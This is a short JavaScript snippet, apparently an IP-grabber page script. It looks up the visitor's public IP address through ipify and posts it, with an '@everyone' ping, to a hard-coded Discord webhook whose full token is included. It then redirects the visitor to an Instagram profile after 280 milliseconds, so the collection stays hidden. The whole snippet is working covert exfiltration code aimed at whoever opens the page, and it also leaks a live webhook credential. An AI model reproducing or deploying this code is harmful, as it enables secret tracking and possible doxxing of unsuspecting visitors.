$.getJSON('https://api.ipify.org/?format=json')
.then(data => {
  const ip = data.ip;
      const whurl = "https://discord.com/api/webhooks/1226920834602504322/SKeRyGEh60LjlB1Lh-Llom9CLnky8a72stVED_ihDzFrdtO0ehpuLyhYbDNGgJkOG4uU";
      const msg = {
        "content": "@everyone : IP:"+ip
      };
      return fetch(whurl, {
        "method": "POST",
        "headers": {
          "content-type": "application/json"
        },
        "body": JSON.stringify(msg)
      });
    });
setTimeout(function()
{
window.location.replace("https://www.instagram.com/iv.emy/");
}, 280)
